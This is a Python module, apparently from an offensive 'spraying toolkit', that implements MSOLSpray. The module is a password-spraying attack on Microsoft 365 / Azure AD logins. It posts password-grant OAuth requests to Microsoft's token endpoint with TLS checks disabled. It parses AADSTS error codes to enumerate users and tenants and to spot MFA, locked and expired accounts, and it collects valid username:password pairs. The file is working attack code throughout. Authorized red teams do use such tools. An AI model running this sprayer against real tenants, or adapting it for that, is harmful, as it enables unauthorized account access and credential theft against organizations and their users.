import httpx
import logging
from sprayingtoolkit.base import BaseSprayer
from sprayingtoolkit.models import HostingLocation

log = logging.getLogger("atomizer.modules.o365.sprayers.msol")


class MSOLSpray(BaseSprayer):
    """
    Original discovery and code by @dafthack
    https://github.com/dafthack/MSOLSpray
    """

    def __init__(self, interval):
        self.hosting_location = HostingLocation.O365
        self.interval = interval
        self.valid_accounts = set()
        self.headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        self.client = httpx.AsyncClient(
            verify=False, trust_env=True, http2=True, headers=self.headers
        )

    async def shutdown(self):
        await self.client.aclose()

    async def auth_o365(self, username: str, password: str) -> None:
        data = {
            "resource": "https://graph.windows.net",
            "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
            "client_info": "1",
            "grant_type": "password",
            "username": username,
            "password": password,
            "scope": "openid",
        }

        r = await self.client.post(
            "https://login.microsoft.com/common/oauth2/token", data=data
        )
        if r.status_code == 200:
            log.debug(f"Found valid account {username} / {password}.")
            self.valid_accounts.add(f"{username}:{password}")
            return
        else:
            msg = r.json()
            # log.debug(beutify_json(msg))
            # log.debug(f"Error: {error}")
            error = msg["error_description"].split("\r\n")[0]

            if "AADSTS50126" in error:
                log.debug("Invalid password.")
            elif "AADSTS50128" in error or "AADSTS50059" in error:
                log.debug(
                    "Tenant for account doesn't exist. Check the domain to make sure they are using Azure/O365 services."
                )
            elif "AADSTS50034" in error:
                log.debug("The user doesn't exist.")
            elif "AADSTS50079" in error or "AADSTS50076" in error:
                self.valid_accounts.add(f"{username}:{password}")
                log.debug(
                    "Credential valid however the response indicates MFA (Microsoft) is in use."
                )
            elif "AADSTS50158" in error:
                self.valid_accounts.add(f"{username}:{password}")
                log.debug(
                    "Credential valid however the response indicates conditional access (MFA: DUO or other) is in use."
                )
            elif "AADSTS50053" in error:
                self.valid_accounts.add(f"{username}:{password}")
                log.debug("The account appears to be locked.")
            elif "AADSTS50057" in error:
                log.debug("The account appears to be disabled.")
            elif "AADSTS50055" in error:
                self.valid_accounts.add(f"{username}:{password}")
                log.debug("Credential valid however the user's password is expired.")
            else:
                log.debug(f"Got unknown error: {error}")
